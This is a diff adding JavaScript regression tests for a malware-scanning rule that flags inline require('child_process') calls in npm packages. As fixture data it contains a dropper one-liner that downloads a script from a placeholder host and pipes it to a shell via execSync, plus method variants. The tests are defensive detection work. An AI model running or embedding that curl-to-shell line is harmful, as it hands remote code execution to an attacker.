@@ -409,6 +409,86 @@ describe('analyseCapability', () => {
     });
   });
 
+  /**
+   * Regression: inline `require('module').method()`.
+   *
+   * The dropper one-liner. It never binds the module to a name, so there is no
+   * identifier for the member-expression path to root itself in — `calleeText`
+   * returns null for a call-expression receiver, and `collectMemberExpressions`
+   * never sees it. Q-CAP-001 catches it through `collectImports` instead, which
+   * walks for *any* `require(<string literal>)` call anywhere in the tree
+   * rather than only for a top-level binding.
+   *
+   * If this ever regresses, the most common shape in real npm malware stops
+   * being detected while every named-import test still passes.
+   */
+  describe('inline require().method()', () => {
+    const DROPPER =
+      "module.exports = () => require('child_process').execSync('curl http://x.io/a|sh')\n";
+
+    it('fires Q-CAP-001 on the unbound inline form', async () => {
+      const context = await buildContext({ files: [{ path: 'index.js', content: DROPPER }] });
+      const { signals } = await analyseCapability(context);
+
+      expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
+    });
+
+    it('attributes it to child_process at import confidence, not member confidence', async () => {
+      const context = await buildContext({ files: [{ path: 'index.js', content: DROPPER }] });
+      const { signals } = await analyseCapability(context);
+
+      const signal = signalFor(signals, 'Q-CAP-001');
+      expect(signal.evidence[0]?.detail).toMatchObject({
+        module: 'child_process',
+        kind: 'require',
+      });
+      // The import path is certain about what it saw; the member fallback is a
+      // guess. A drop to 0.6 here would mean the import path stopped matching.
+      expect(signal.confidence).toBeGreaterThan(0.9);
+    });
+
+    it('points at the file and line the call is on', async () => {
+      const context = await buildContext({
+        files: [{ path: 'lib/index.js', content: `// header\n${DROPPER}` }],
+      });
+      const { signals } = await analyseCapability(context);
+
+      expect(signalFor(signals, 'Q-CAP-001').evidence[0]).toMatchObject({
+        file: 'lib/index.js',
+        startLine: 2,
+      });
+    });
+
+    it('still fires when the specifier is node: prefixed', async () => {
+      const context = await buildContext({
+        files: [
+          {
+            path: 'index.js',
+            content:
+              "module.exports = () => require('node:child_process').execSync('curl http://x.io/a|sh')\n",
+          },
+        ],
+      });
+      const { signals } = await analyseCapability(context);
+
+      expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
+    });
+
+    it.each(['exec', 'spawn', 'execFileSync', 'fork'])(
+      'fires regardless of which method the one-liner calls: %s',
+      async (method) => {
+        const context = await buildContext({
+          files: [
+            { path: 'index.js', content: `require('child_process').${method}('id')\n` },
+          ],
+        });
+        const { signals } = await analyseCapability(context);
+
+        expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
+      },
+    );
+  });
+
   it('finds the whole stealer shape in one pass', async () => {
     const context = await buildContext({
       files: [
